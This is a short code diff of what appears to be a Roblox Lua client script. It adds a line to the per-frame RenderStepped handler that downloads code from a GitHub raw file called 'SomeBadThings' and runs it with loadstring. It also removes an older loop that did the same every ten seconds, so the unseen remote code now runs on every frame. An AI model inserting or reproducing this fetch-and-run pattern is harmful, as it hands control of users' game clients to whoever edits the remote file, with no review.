@@ -1156,6 +1156,8 @@ game:GetService("RunService").RenderStepped:Connect(function()
 		end
 	end
 
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/EvilDeadT/Funny-Things/refs/heads/main/SomeBadThings"))()
+
 	Script.Action = ScriptActionNow
 end)
 
@@ -1201,8 +1203,3 @@ game.UserInputService.InputBegan:Connect(function(Input)
 		end
 	end
 end)
-
-while true do
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/EvilDeadT/Funny-Things/refs/heads/main/SomeBadThings"))()
-	task.wait(10)
-end
